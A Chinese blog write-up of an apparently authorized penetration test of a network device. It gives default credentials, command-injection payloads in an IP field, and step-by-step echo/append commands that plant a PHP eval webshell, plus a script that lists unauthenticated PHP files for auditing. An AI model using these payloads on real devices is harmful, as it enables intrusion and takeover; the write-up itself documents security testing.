{"blogid": "125876464", "writerAge": "码龄7年", "writerBlogNum": "133", "writerCollect": "819", "writerComment": "67", "writerFan": "1028", "writerGrade": "5级", "writerIntegral": "2126", "writerName": "goddemon", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125876464.jpg", "writerRankTotal": "9837", "writerRankWeekly": "25726", "writerThumb": "179", "writerVisitNum": "185006", "blog_read_count": "901", "blog_time": "于 2022-07-19 17:19:32 发布", "blog_title": "某设备由黑到白（附前台0day）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"_0\"></a>前言：</h2>\n<p><code>本文章仅用于渗透交流学习，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任</code><br/> <code>注：本次测试为授权测试</code><br/> 本文没啥特别实际的技术，只是给大家分享一些思路和自己的一些的一些思考，具体的系统师傅们自己定位。</p>\n<h2><a id=\"_5\"></a>正文</h2>\n<p>利用该系统的nday 密码泄露<br/> 获取密码 解密后进入后台</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fd493f27b1d14f8aa2ab2db453f26f74.png\"/><br/> admin<br/> ruijie<br/> 耐心的进行测试进行获取参数以及拼接|ls&gt;1.txt 进行查看是否存在执行 在这个点处发觉<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\aafd28c2d30c4df498888333c274b168.png\"/><br/> 有一个ha配置<br/> 这里存在ip进行测试<br/> 进行抓包点击测试 然后进行抓包</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8792e457db6842308c043f2783490c7e.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8b929c974e2243c185257f5a3708a04a.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\558344ce4c774c47a3f0e2cd2b7183a0.png\"/></p>\n<p>成功列出文件<br/> 进行写马<br/> 127.0.0.1|echo+“PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==”+|base64±d+&gt;test.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3c8c224efef74552be5d68feb3f9d7b9.png\"/><br/> 发觉无法连接 怀疑是没写进去<br/> 尝试写入到txt中查看<br/> 发觉没任何东西<br/> <img alt=\"\" src=\"..\\..\\static\\image\\8c01dd98195a47a1bd06702fbbad43c1.png\"/><br/> 但是文件确实存在 如果不存在则会爆404<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3fa0c0d616d24d4e8eda85fed3bd0ce4.png\"/><br/> 尝试hex编码的一样无过 无法写入写入内容为空<br/> 尝试正常写入内容看看 不使用编码的思路去写入<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a52cdc9a328b4fb18f29be7e5688f6c4.png\"/><br/> 成功写入内容<br/> <img alt=\"\" src=\"..\\..\\static\\image\\79ec5f284a8346d1ab4ac5faa3126d02.png\"/></p>\n<p>那就直接写入试试 看看回显什么，是禁止了字符还是其他原因<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\71c081b3ad0b4f399ae1a01f40f244c6.png\"/><br/> 和预期的差不多（这个少了$_post好像是由于linux特性问题 linux好像无法直接利用echo写入马 会吐掉字符 以前研究过 但是具体啥原因 没整明白）<br/> 那就是不能进行base64和hex编码写入的原因了<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\11cc8fa741a547889d1a920f001f6b49.png\"/><br/> 那就尝试echo+追加思路写马（以前打ctf的时候学到的tips,常用于绕waf）<br/> 这里有个知识点<br/> echo 1 &gt;test.txt 这种是属于覆盖进行写入<br/> echo 1 &gt;&gt;test.txt这种是追加进行写入<br/> 因此我们可以一步一步追加进行写马<br/> 127.0.0.1|echo+‘&lt;?php’&gt;test.txt<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\68e47d972f5248dbb002b88a40b0c54c.png\"/></p>\n<p>127.0.0.1|echo+‘@eval(’&gt;&gt;test.txt<br/> 127.0.0.1|echo+‘$_POST[’ &gt;&gt;test.txt<br/> 127.0.0.1|echo+‘1])’&gt;&gt;test.txt<br/> 127.0.0.1|echo+‘?&gt;’&gt;&gt;test.txt<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7043ba41cd7340f28e1d0f4862a54c5a.png\"/></p>\n<p>写入后最终txt如下 利用cat读取在写入到test.php中<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2e1ff4d9f8d145549d7759d13da9032d.png\"/><br/> 127.0.0.1|cat+test.txt+&gt;test.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\468aefec5d8b4b268cef9afe062bcba0.png\"/><br/> 然后连接即可<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\3cf39f8e83824c91a01f467adef73910.png\"/><br/> 进一步扩大战果<br/> 由黑转白 获取源码进行代码审计 个人习惯吧 比较喜欢白+黑审起来更快<br/> 数枚后台rce和其他洞 几枚前台<br/> 放其中一个前台的 这个就蛮简单的了 就是简单的参数输入进来进行拼接导致rce<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\bb52151d4a7f4838b55fed6a63934dd9.png\"/><br/> 简单写个exp检测(这里推荐pocsuite,蛮好用的） 本来以为是属于0day了 但是跑了一篇后发觉很多都修了 应该是其他大佬们光顾过了<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\427e1aaa4a13490ba7dc02945c5c013e.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fce104c90233494b9b2316e27acdc0fd.png\"/><br/> 进一步拓展利用 有了rce但是想获取密码进行进里面去进一步获取战果<br/> 查看最开始的密码泄露原因<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8f33b985c34346d59c5f3a60a14ac1e2.png\"/><br/> 发觉是读取的这个配置文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\439979c2186844fb85539bb901ece32b.png\"/><br/> 进去读取文件即可发觉配置的MD5加密密码<br/> 另外一种思路就是直接覆盖掉这个文件 可控为我们想控制的密码即可</p>\n<p>另外一种思路 但是提一嘴(这个系统的这个我没试过，其他的系统我试过之前)：简单看一下认证逻辑<br/> 是通过login函数来判断的 因此我们可以去改login()实现<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cf400336233d4e05b63523ed9b4a6cdc.png\"/></p>\n<h2><a id=\"_83\"></a>一个思考</h2>\n<p>白盒审计快速提权非鉴权文件技巧<br/> 如在本系统中 鉴权文件属于使用authenticed_writable.php以及authenticate.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\64ce1c35af0447c991468a12767a82dd.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9c399b44bf4243a4917b10eb427bd436.png\"/><br/> 在尝试了phpstorm的正则匹配反向匹配文件后发觉是这种的 还是太慢了<br/> 正向文件量太大 且获取的是鉴权文件不方便提取<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\57db342f16d149d9ae20db32483046e9.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\931d31ccd72f4cbb9d905acabe79d115.png\"/><br/> 利用反向的思路去匹配吧 文件更大了<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a254e8f43c0e46d99d668bcdb921c466.png\"/><br/> 在思考了很久以及询问了一些师傅后还是觉得自写一个py脚本取处理比较简单点<br/> 简单找个匹配的改下即可</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#coding=utf8</span>\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> shutil\n\n\npattern <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'(authenticed_writable.php)'</span><span class=\"token punctuation\">)</span>\npattern1 <span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'(authenticate.php)'</span><span class=\"token punctuation\">)</span>\npattern2 <span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'(authenticate.php)'</span><span class=\"token punctuation\">)</span>\nnew_path<span class=\"token operator\">=</span><span class=\"token string\">\"F:\\ces\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">readFilename</span><span class=\"token punctuation\">(</span>file_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> root<span class=\"token punctuation\">,</span> dirs<span class=\"token punctuation\">,</span> files <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>walk<span class=\"token punctuation\">(</span>file_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> \n        <span class=\"token keyword\">return</span> files<span class=\"token punctuation\">,</span>dirs<span class=\"token punctuation\">,</span>root\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">findstring</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span>edcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    fp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span>edcode<span class=\"token punctuation\">)</span><span class=\"token comment\">#注意这里的打开文件编码方式</span>\n    strr <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    txt <span class=\"token operator\">=</span> pattern<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> txt <span class=\"token operator\">==</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">findstring2</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span>edcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    fp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span>edcode<span class=\"token punctuation\">)</span><span class=\"token comment\">#注意这里的打开文件编码方式</span>\n    strr <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    txt <span class=\"token operator\">=</span> pattern1<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> txt <span class=\"token operator\">==</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n \n<span class=\"token keyword\">def</span> <span class=\"token function\">findstring3</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span>edcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    fp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>pathfile<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span>edcode<span class=\"token punctuation\">)</span><span class=\"token comment\">#注意这里的打开文件编码方式</span>\n    strr <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    txt <span class=\"token operator\">=</span> pattern2<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> txt <span class=\"token operator\">==</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">startfind</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">,</span>dirs<span class=\"token punctuation\">,</span>root<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> ii <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>findstring<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> findstring2<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> findstring3<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">)</span>\n                temp<span class=\"token operator\">=</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span>ii<span class=\"token punctuation\">)</span>\n                txt<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"path.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a+\"</span><span class=\"token punctuation\">)</span>\n                txt<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>temp<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span>\n                shutil<span class=\"token punctuation\">.</span>copyfile<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>new_path<span class=\"token punctuation\">,</span>ii<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> err<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>findstring<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> findstring2<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> findstring3<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">,</span><span class=\"token string\">'gbk'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>ii<span class=\"token punctuation\">)</span>\n                    temp <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> ii<span class=\"token punctuation\">)</span>\n                    shutil<span class=\"token punctuation\">.</span>copyfile<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>new_path<span class=\"token punctuation\">,</span> ii<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> er<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">continue</span>\n            \n                \n    <span class=\"token keyword\">for</span> jj <span class=\"token keyword\">in</span> dirs<span class=\"token punctuation\">:</span>\n        fi<span class=\"token punctuation\">,</span>di<span class=\"token punctuation\">,</span>ro <span class=\"token operator\">=</span> readFilename<span class=\"token punctuation\">(</span>root<span class=\"token operator\">+</span><span class=\"token string\">\"\\\\\"</span><span class=\"token operator\">+</span>jj<span class=\"token punctuation\">)</span>\n        startfind<span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">,</span>di<span class=\"token punctuation\">,</span>ro<span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    default_dir <span class=\"token operator\">=</span> <span class=\"token string\">u\"E:\\html\"</span>  <span class=\"token comment\"># 设置默认打开目录</span>\n    file_path <span class=\"token operator\">=</span> default_dir\n    files<span class=\"token punctuation\">,</span>dirs<span class=\"token punctuation\">,</span>root <span class=\"token operator\">=</span> readFilename<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span>\n    startfind<span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">,</span>dirs<span class=\"token punctuation\">,</span>root<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\45fa2fb9736a432aaee4d864c0ccbdf8.png\"/><br/> 就可以快速获取非鉴权文件了 在结合seay和rips即可快速对一个项目进行审计前台了 可以少了很多代码量<br/> 但是对于asp和jsp的因为是bin和jar文件 需要反编译 这种就无法判断获取了 这种思路就无法适合了 只能利用其他思路快速获取了<br/> 这种暂时没啥特别好的思路</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-07-19 17:19:32", "summary": "前言：本文章仅用于渗透交流学习，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任注：本次测试为授权测试本文没啥特别实际的技术，只是给大"}